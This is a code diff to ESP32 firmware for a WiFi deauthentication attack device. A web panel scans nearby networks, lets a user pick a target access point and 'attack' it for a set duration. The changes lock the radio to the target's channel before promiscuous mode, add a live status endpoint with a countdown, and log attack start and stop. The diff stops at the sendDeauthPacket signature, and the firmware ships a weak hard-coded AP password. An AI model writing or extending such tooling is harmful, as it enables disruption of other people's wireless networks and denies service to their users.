@@ -15,11 +15,12 @@ const char* ap_password = "12345678";
 const uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
 
 // WiFi scanning and attack variables
-int current_channel = 1;
 bool attack_active = false;
 uint8_t target_bssid[6];
 unsigned long attack_start_time = 0;
-int attack_duration = 10;  // Default duration in seconds
+int attack_duration = 10;  // seconds
+int target_channel = 1;
+String attack_log = "";
 
 // ---------------- LED Helper ----------------
 void setLED(uint8_t r, uint8_t g, uint8_t b) {
@@ -45,6 +46,7 @@ void setup() {
   server.on("/scan", handleScan);
   server.on("/start", handleStartAttack);
   server.on("/stop", handleStopAttack);
+  server.on("/status", handleStatus); // Status endpoint
 
   server.begin();
 }
@@ -61,6 +63,7 @@ void loop() {
       attack_active = false;
       WiFi.softAP(ap_ssid, ap_password);
       setLED(0, 0, 255); // back to blue
+      attack_log = "Attack finished";
     }
   }
 }
@@ -79,6 +82,7 @@ void handleRoot() {
     th { background-color: #f2f2f2; }
     button { margin: 5px; padding: 8px 16px; }
     .container { max-width: 800px; margin: 0 auto; }
+    #status-bar { margin-top:15px;padding:10px;background:#eee;border-radius:5px; }
   </style>
 </head>
 <body>
@@ -115,6 +119,8 @@ void handleRoot() {
     
     <div id="attack-status" style="margin-top: 15px; padding: 10px; background-color: #ffeaea; display: none;"></div>
   </section>
+
+  <div id="status-bar">Status: Idle</div>
 </div>
 
 <script>
@@ -147,7 +153,7 @@ function scanNetworks() {
           <td><code>${network.bssid}</code></td>
           <td>${network.channel}</td>
           <td>${network.rssi} dBm</td>
-          <td><button onclick="selectTarget('${network.bssid}', '${network.ssid}')" style="background-color: #2196F3; color: white;">Select</button></td>
+          <td><button onclick="selectTarget('${network.bssid}', '${network.ssid}', ${network.channel})" style="background-color: #2196F3; color: white;">Select</button></td>
         </tr>`;
       });
       
@@ -156,11 +162,12 @@ function scanNetworks() {
     });
 }
 
-function selectTarget(bssid, ssid) {
+function selectTarget(bssid, ssid, channel) {
   document.getElementById('target-ssid').textContent = ssid;
+  window.selectedBSSID = bssid;
+  window.selectedChannel = channel;
   document.getElementById('attack-control').style.display = 'block';
   document.getElementById('attack-status').style.display = 'none';
-  window.selectedBSSID = bssid;
 }
 
 function startAttack() {
@@ -170,7 +177,7 @@ function startAttack() {
   statusEl.style.display = 'block';
   statusEl.innerHTML = `<span style="color: #d32f2f;">Attacking ${document.getElementById('target-ssid').textContent} for ${duration} seconds...</span>`;
   
-  fetch(`/start?bssid=${encodeURIComponent(window.selectedBSSID)}&duration=${duration}`)
+  fetch(`/start?bssid=${encodeURIComponent(window.selectedBSSID)}&channel=${window.selectedChannel}&duration=${duration}`)
     .then(() => {
       statusEl.innerHTML = `<span style="color: #388E3C;">Attack started successfully!</span>`;
     })
@@ -193,6 +200,15 @@ function stopAttack() {
       statusEl.innerHTML = `<span style="color: #d32f2f;">Error stopping attack!</span>`;
     });
 }
+
+// Live status updater with countdown
+setInterval(() => {
+  fetch('/status')
+    .then(res => res.json())
+    .then(data => {
+      document.getElementById('status-bar').innerText = "Status: " + data.status;
+    });
+}, 1000);
 </script>
 </body>
 </html>
@@ -228,6 +244,9 @@ void handleStartAttack() {
     if (server.hasArg("duration")) {
       attack_duration = server.arg("duration").toInt();
     }
+    if (server.hasArg("channel")) {
+      target_channel = server.arg("channel").toInt();
+    }
     
     sscanf(bssidStr.c_str(), "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx", 
            &target_bssid[0], &target_bssid[1], &target_bssid[2],
@@ -236,14 +255,15 @@ void handleStartAttack() {
     attack_active = true;
     attack_start_time = millis();
     
-    // Switch to monitor mode for attack
     WiFi.mode(WIFI_OFF);
     wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
     esp_wifi_init(&cfg);
     esp_wifi_set_mode(WIFI_MODE_STA);
     esp_wifi_start();
+    esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE); // Lock channel
     esp_wifi_set_promiscuous(true);
 
+    attack_log = "Attack started on " + bssidStr + " (Channel " + String(target_channel) + ")";
     setLED(255, 0, 0); // Red = attacking
     
     server.send(200, "text/plain", "Attack started");
@@ -256,7 +276,21 @@ void handleStopAttack() {
   attack_active = false;
   WiFi.softAP(ap_ssid, ap_password);
   setLED(0, 0, 255); // back to blue
+  attack_log = "Attack stopped manually";
   server.send(200, "text/plain", "Attack stopped");
+}
+
+void handleStatus() {
+  String status;
+  if (attack_active) {
+    int elapsed = (millis() - attack_start_time) / 1000;
+    int remaining = attack_duration - elapsed;
+    if (remaining < 0) remaining = 0;
+    status = "Attacking... " + String(remaining) + "s remaining";
+  } else {
+    status = "Idle";
+  }
+  server.send(200, "application/json", "{\"status\":\"" + status + "\",\"log\":\"" + attack_log + "\"}");
 }
 
 void sendDeauthPacket(const uint8_t* bssid, const uint8_t* sta) {
